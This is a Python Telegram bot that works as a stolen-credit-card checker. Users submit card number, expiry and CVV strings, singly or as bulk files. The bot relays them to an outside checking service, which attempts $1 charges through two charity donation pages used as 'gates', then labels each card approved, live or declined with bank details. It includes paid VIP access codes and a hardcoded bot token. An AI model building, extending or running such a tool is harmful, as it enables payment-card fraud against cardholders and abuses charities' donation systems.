import os
import re
import time
import random
import string
import asyncio
import requests
import httpx
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'

# ------------------- Users -------------------

ADMINS = [6843321125]
VIP_USERS = {}
BANNED_USERS = {}
ALL_USERS = set()
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7

# ------------------- Gates -------------------

GATES = [
    "https://rightchange.org/?give_forms=zakat",
    "https://www.wfft.org/donations/general-donation/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)

# ------------------- Codes -------------------

CODES = {}

# ------------------- BIN Lookup -------------------

def get_bin_info(cc_num):
    bin_num = cc_num[:6]
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=8)
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            type_ = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country = data.get('country', {}).get('name', 'UNKNOWN').upper()
            emoji = data.get('country', {}).get('emoji', '🏳️')
            currency = data.get('country', {}).get('currency', 'UNK')
            return {
                "info": f"{scheme} - {type_} - {brand}",
                "bank": bank,
                "country": f"{country} {emoji} - [{currency}]"
            }
    except:
        pass
    return {"info": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}

# ------------------- Check API -------------------

async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)
    params = {"url": gate, "card": card_full, "amount": 1.00}

    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=20) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                result_raw = r.json().get('result','')
                result = result_raw.lower()

                if "charge" in result or "success" in result:
                    return "approved", result_raw
                elif "insufficient" in result:
                    return "live", result_raw
                else:
                    return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------

async def format_response(card_full, status, response, taken, mode="single"):
    bin_data = get_bin_info(card_full.split("|")[0][:6])

    info = bin_data["info"]
    bank = bin_data["bank"]
    country = bin_data["country"]

    title = "#PayPal_Charge ($1)"
    title += " [mass] 🌟" if mode == "mass" else " [single] 🌟"

    return f"""{title}
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐂𝐚𝐫𝐝: {card_full}
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐈𝐧𝐟𝐨: {info}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
- - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝐓𝐢𝐦𝐞: {taken}s
[⎇] 𝐑𝐞𝐪 𝐁𝐲: VIP
- - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝐃𝐞𝐯 𝐛𝐲: Wafa - 🍀
"""

# ------------------- Permissions -------------------

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    elif BANNED_USERS.get(user_id):
        return False
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    else:
        return mode == "single"

# ------------------- /pp -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "single"):
        await update.message.reply_text("❌ VIP only for single check.")  
        return  

    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):  
        now = time.time()  
        last = last_check_time.get(user_id, 0)  
        if now - last < ANTI_SPAM_SECONDS:  
            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")  
            return  
        last_check_time[user_id] = now  

    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time()-start_time,2)
    text = await format_response(card_full, status, response, taken, "single")
    await update.message.reply_text(text)

# ------------------- /stop -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)

    if not can_user_check(user_id, "file"):  
        await update.message.reply_text("❌ VIP only for file check.")  
        return  

    asyncio.create_task(process_file(update, context))

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False
    os.makedirs("downloads", exist_ok=True)
    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)
    results_file_path = f"downloads/results_{file.file_id}.txt"
    approved=live=declined=0
    panel_msg = await update.message.reply_text("Start Checking... 🔍")
    with open(file_path,'r',encoding='utf-8') as f:
        lines = f.readlines()

    async def process_line(line):  
        nonlocal approved, live, declined  
        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}',line)  
        if not match: return None  
        card_full = match[0]  
        start_time=time.time()  
        status,response = await check_card_api(card_full)  
        await asyncio.sleep(random.uniform(1,5))  
        taken = round(time.time()-start_time,2)  
        text = await format_response(card_full,status,response,taken,"mass")  
        if status=="approved": approved+=1; await update.message.reply_text(text)  
        elif status=="live": live+=1; await update.message.reply_text(text)  
        else: declined+=1  
        last_info,last_bank,last_country = get_bin_info(card_full.split("|")[0][:6]).values()  
        panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved+live+declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
        try: await panel_msg.edit_text(panel)
        except: pass
        return text

    for line in lines:  
        if stop_users.get(user_id): await update.message.reply_text("Stopped ⛔"); return  
        await process_line(line)  

    with open(results_file_path,'w',encoding='utf-8') as result_file:  
        for line in lines:  
            r = await format_response(line.strip(),"N/A","N/A",0,"mass")  
            result_file.write(r+"\n\n")  
    await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

# ------------------- /try -------------------

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=reply_text)
        await update.message.reply_text("✅ Sent")
    except:
        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")

# ------------------- /code -------------------

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Code usage limit reached")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")

# ------------------- /wafa -------------------

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can create codes")
    if len(context.args)<2: 
        return await update.message.reply_text("Usage:\n/wafa DAYS MAX_USERS")
    try:
        duration=int(context.args[0])
        max_users=int(context.args[1])
    except:
        return await update.message.reply_text("❌ Invalid numbers")
    code = "WAFA-"+"-".join("".join(random.choices(string.ascii_uppercase+string.digits,k=4)) for _ in range(3))
    CODES[code] = {"duration":duration,"max_users":max_users,"used":0,"created":time.time()}
    await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")

# ------------------- /show_users -------------------

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin")
    msg = "📊 All Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        expire = f" expires in {int((VIP_USERS[uid]-time.time())/3600)}h" if uid in VIP_USERS else ""
        msg+=f"{uid} - {status}{expire}\n"
    await update.message.reply_text(msg if msg else "No users yet")

# ------------------- Ban/Unban -------------------

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can ban users")
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/ban_user USER_ID")
    uid=int(context.args[0])
    BANNED_USERS[uid]=True
    VIP_USERS.pop(uid,None)
    await update.message.reply_text(f"User {uid} banned ✅")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS: 
        return await update.message.reply_text("❌ Only admin can unban users")
    if len(context.args)==0: 
        return await update.message.reply_text("Usage:\n/unban_user USER_ID")
    uid=int(context.args[0])
    BANNED_USERS.pop(uid,None)
    await update.message.reply_text(f"User {uid} unbanned ✅")

# ------------------- /start -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
